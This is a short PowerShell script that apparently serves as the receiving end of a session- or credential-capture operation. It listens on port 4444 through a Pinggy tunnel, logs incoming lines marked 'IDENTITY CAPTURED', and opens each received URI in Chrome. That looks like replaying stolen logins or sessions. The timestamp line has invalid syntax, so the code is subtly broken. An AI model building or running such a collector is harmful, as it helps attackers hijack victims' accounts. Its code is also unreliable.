
[Console]::Clear()
$green = [char]27 + "[32m"; $cyan = [char]27 + "[36m"; $reset = [char]27 + "[0m"

Write-Host "$green  OMNI-I ACTIVE MONITORING - PORT 4444$reset"
Write-Host " [ TRANSPORT: PINGGY | HOST: whdwv-103-148-21-154 ] " -ForegroundColor Cyan
Write-Host "--------------------------------------------------------"

$Listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 4444)
$Listener.Start()
Write-Host " [*] SYSTEM ONLINE. WAITING FOR IDENTITY REFLECTION..." -ForegroundColor Yellow

while($true) {
    if ($Listener.Pending()) {
        $Client = $Listener.AcceptTcpClient()
        $Data = (New-Object System.IO.StreamReader($Client.GetStream())).ReadLine()
        
        if ($Data -like "IDENTITY:*") {
            $Uri = $Data.Replace("IDENTITY:", "")
            Write-Host " [$([Get-Date -Format 'HH:mm:ss'])] $green[!] IDENTITY CAPTURED: $Uri$reset"
            
            Start-Process "chrome.exe" "$Uri --new-window"
        }
    }
    Start-Sleep -Milliseconds 250
}